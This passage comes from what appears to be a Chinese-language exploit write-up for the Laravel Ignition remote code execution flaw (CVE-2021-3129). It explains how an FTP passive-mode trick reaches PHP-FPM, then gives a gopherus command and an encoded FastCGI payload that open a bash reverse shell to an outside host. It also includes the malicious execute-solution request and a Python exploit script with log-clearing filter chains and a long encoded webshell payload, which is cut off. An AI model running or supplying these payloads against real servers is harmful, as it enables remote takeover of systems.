</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091315778.png"
        data-srcset="/images/202202091315778.png, /images/202202091315778.png 1.5x, /images/202202091315778.png 2x"
        data-sizes="auto"
        alt="/images/202202091315778.png"
        title="/images/202202091315778.png" /></p>
<p><strong>利用FTP与PHP-FPM进行交互</strong></p>
<p>由于我们可以运行file_get_contents来查找任何东西，因此，可以通过发送HTTP请求来扫描常用端口。结果发现，PHP-FPM似乎正在侦听端口9000。</p>
<p>众所周知，如果我们能向PHP-FPM服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但PHP却不支持。</p>
<p>另一个已知的允许通过TCP发送二进制数据包的协议是FTP，更准确的说是该协议的被动模式：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的一个端口，如果它愿意的话。</p>
<p>现在，如果我们尝试使用viewFile=ftp://evil-server.lexfo.fr/file.txt来利用这个漏洞，会发生以下情况：</p>
<p>file_get_contents()连接到我们的FTP服务器，并下载file.txt。</p>
<p>file_put_contents()连接到我们的FTP服务器，并将其上传回file.txt。</p>
<p>您可能已经知道这是怎么回事：我们将使用FTP协议的被动模式让file_get_contents()在我们的服务器上下载一个文件，当它试图使用file_put_contents()把它上传回去时，我们将告诉它把文件发送到127.0.0.1:9000。</p>
<p>这样，我们就可以向PHP-FPM发送一个任意的数据包，从而执行代码。</p>
<p>利用这种方法，在我们的目标上成功地利用了该漏洞。</p>
<p>下面我们来演示一下攻击过程。</p>
<p>首先，我们使用gopherus生成攻击fastcgi的payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python gopherus.py --exploit fastcgi
</span></span><span class="line"><span class="cl">/var/www/public/index.php  <span class="c1"># 这里输入的是目标主机上一个已知存在的php文件</span>
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/9999 0&gt;&amp;1&#34;</span>  <span class="c1"># 这里输入的是要执行的命令</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091315554.png"
        data-srcset="/images/202202091315554.png, /images/202202091315554.png 1.5x, /images/202202091315554.png 2x"
        data-sizes="auto"
        alt="/images/202202091315554.png"
        title="/images/202202091315554.png" /></p>
<p>得到payload，而我们需要的是上面payload中 **_**后面的数据部分，即：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mi">08</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">04</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">01</span><span class="o">%</span><span class="mo">07</span><span class="o">%</span><span class="mo">07</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mi">0</span><span class="nx">F</span><span class="o">%</span><span class="mi">10</span><span class="nx">SERVER_SOFTWAREgo</span><span class="o">%</span><span class="mi">20</span><span class="o">/%</span><span class="mi">20</span><span class="nx">fcgiclient</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">0</span><span class="nx">B</span><span class="o">%</span><span class="mi">09</span><span class="nx">REMOTE_ADDR127</span><span class="o">.</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="nx">F</span><span class="o">%</span><span class="mi">08</span><span class="nx">SERVER_PROTOCOLHTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="o">%</span><span class="mi">0</span><span class="nx">E</span><span class="o">%</span><span class="mo">03</span><span class="nx">CONTENT_LENGTH106</span><span class="o">%</span><span class="mi">0</span><span class="nx">E</span><span class="o">%</span><span class="mo">04</span><span class="nx">REQUEST_METHODPOST</span><span class="o">%</span><span class="mi">09</span><span class="nx">KPHP_VALUEallow_url_include</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">20</span><span class="nx">On</span><span class="o">%</span><span class="mi">0</span><span class="nx">Adisable_functions</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">0</span><span class="nx">Aauto_prepend_file</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">20</span><span class="nx">php</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="c1">//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>将数据添加到如下<strong>FTP脚本</strong>中的payload(脚本在文章末尾和 POC目录中)</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091315770.png"
        data-srcset="/images/202202091315770.png, /images/202202091315770.png 1.5x, /images/202202091315770.png 2x"
        data-sizes="auto"
        alt="/images/202202091315770.png"
        title="/images/202202091315770.png" /></p>
<p>监听刚刚的反弹shell端口并运行 FTP脚本</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091315318.png"
        data-srcset="/images/202202091315318.png, /images/202202091315318.png 1.5x, /images/202202091315318.png 2x"
        data-sizes="auto"
        alt="/images/202202091315318.png"
        title="/images/202202091315318.png" /></p>
<p>发送请求反弹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="err">xxx.xxx.xxx.xxx:</span><span class="mi">8888</span>
</span></span><span class="line"><span class="cl"><span class="err">Content-Type:</span> <span class="err">application/json</span>
</span></span><span class="line"><span class="cl"><span class="err">Content-Length:</span> <span class="mi">191</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;ftp://aaa@xxx.xxx.xxx.xxx:23/123&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/202202091316222.png"
        data-srcset="/images/202202091316222.png, /images/202202091316222.png 1.5x, /images/202202091316222.png 2x"
        data-sizes="auto"
        alt="/images/202202091316222.png"
        title="/images/202202091316222.png" /></p>
<p>使用Docker环境无法复现，需要搭建另一个环境</p>
<h2 id="漏洞poc">漏洞POC</h2>
<p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py" target="_blank" rel="noopener noreffer">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py</a>
</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*- </span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span><span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">header</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span><span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span><span class="s2">&#34;application/json&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clearlog</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">AA</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;AA&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sendpayloadwindows</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=0